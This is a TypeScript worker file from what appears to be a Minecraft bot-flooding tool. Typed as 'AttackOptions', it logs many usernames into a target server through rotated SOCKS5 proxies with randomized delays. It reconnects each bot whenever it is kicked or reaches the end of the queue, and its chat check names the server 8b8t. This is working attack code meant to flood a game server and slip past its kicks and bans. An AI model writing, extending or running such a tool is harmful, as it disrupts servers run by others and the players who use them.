import { parentPort, workerData as anyWorkerData } from 'worker_threads'
import { AttackOptions } from '../../utils/types'
import 'colors'
import { getRandomArbitrary, sleep } from 'emberutils'
import { Client, createClient } from 'minecraft-protocol'
import { SocksClient } from 'socks'
import {kickHandler, log, shuffle} from '../shared'
import prismarineChat from 'prismarine-chat'

const chatInstance = prismarineChat('1.12')
const { fromNotch } = chatInstance

// const queueRegex = /(?<=Position in queue: )\d+/gm
const spaceRegex = /\s{2,}/gm

const workerOptions: AttackOptions = anyWorkerData

async function awaitReady () {
  return await new Promise<void>(resolve => {
    parentPort!.once('message', async message => {
      if (message.ready) resolve()
      else await awaitReady()
    })
  })
}

async function main () {
  await awaitReady()

  const usernames = workerOptions.usernames

  shuffle(usernames)
  if (workerOptions.proxy)
    shuffle(workerOptions.proxy)

  let i = 0
  for (const username of usernames) {
    async function createBot (): Promise<Client> {
      if (workerOptions.useTimeout) {
        const timeout = getRandomArbitrary(5000, 200000)
        log(`[${username}] Waiting for ${timeout / 1000}s before logging in...`)
        await sleep(timeout)
      }

      return createClient({
        username: username,
        host: workerOptions.host,
        port: workerOptions.port,
        version: '1.12.2',
        connect: (workerOptions.proxy != undefined)
          ? async (client) => {
            const proxy = workerOptions.proxy![i]
            return await SocksClient.createConnection({
              proxy: {
                host: proxy.host,
                port: proxy.port,
                type: 5
              },
              command: 'connect',
              destination: {
                host: workerOptions.host,
                port: workerOptions.port
              }
            }).then((info) => {
              client.setSocket(info.socket)
              client.emit('connect')
            }).catch((err) => {
              if (err.toString().includes('ETIMEDOUT')) {
                log(`[${username}] Proxy timed out`.red)
              } else if (err.toString().includes('Socket closed')) {
                log(`[${username}] Proxy socket closed`.red)
              } else console.log(err)
            })
          }
          : undefined
      })
    }

    log(`[${i + 1}/${usernames.length}] Creating bot ${username}... (${usernames.length - i} left)`.green)
    let bot = await createBot()
    registerListeners()

    function registerListeners () {
      bot.once('login', botLoginHandler)
      bot.once('kicked', reason => kickHandler(reason, username))
    }

    function botLoginHandler () {
      log(`[${username}] Logged in`.green)
      bot.on('chat', async packet => {
        const object = fromNotch(packet.message)
        const message = object.toString()

        if (message === '' || message === ' ' || message === '\u200b' || !message || spaceRegex.test(message)) return

        log(`[${username}] ${message}`.yellow)
        if (message.includes('8b8t')) {
          log(`[${username}] Reached the end of the queue, ending the connection and reconnecting...`.green)
          bot.end()
          bot = await createBot()
          registerListeners()
        }
      })
      bot.once('kicked', async reason => {
        const object = fromNotch(reason)
        log(`[${username}] ${object.toString().red}`.yellow + ', recreating the bot...')
        bot.end()
        bot = await createBot()
        registerListeners()
      })
    }

    i++
  }
}

main().catch(error => {
  log(error)
})
